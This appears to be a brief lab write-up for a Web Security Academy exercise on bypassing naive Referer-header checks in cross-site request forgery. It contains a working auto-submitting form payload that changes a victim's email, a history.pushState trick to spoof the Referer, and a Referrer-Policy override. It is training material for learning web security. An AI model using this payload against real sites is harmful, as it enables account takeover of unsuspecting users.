# CSRF Vulnerability - Referer Header


## Let generate some Payloads!

```php
<script>history.pushState("", "", "/?X.web-security-academy.net")</script>

<form method='POST' action="https:/X.web-security-academy.net/my-account/change-email">
	<input type="text" name="email" value="test@normal-user.net">
</form>
<script>
	document.forms[0].submit();
</script>
```

## Takeaway

- Some applications validate the Referer header in a naive way that can be bypassed. For example, if the application validates that the domain in the Referer starts with the expected value, then the attacker can place this as a subdomain of their own domain:

```php
<script>history.pushState("", "", "/?X.web-security-academy.net")</script>
```

- This will cause the Referer header in the generated request to contain the URL of the target site in the query string.


 many browsers now strip the query string from the Referer header by default.
 - To fix this, we override the behaviour! using in the head:

 ```
 Referrer-Policy: unsafe-url
 ```
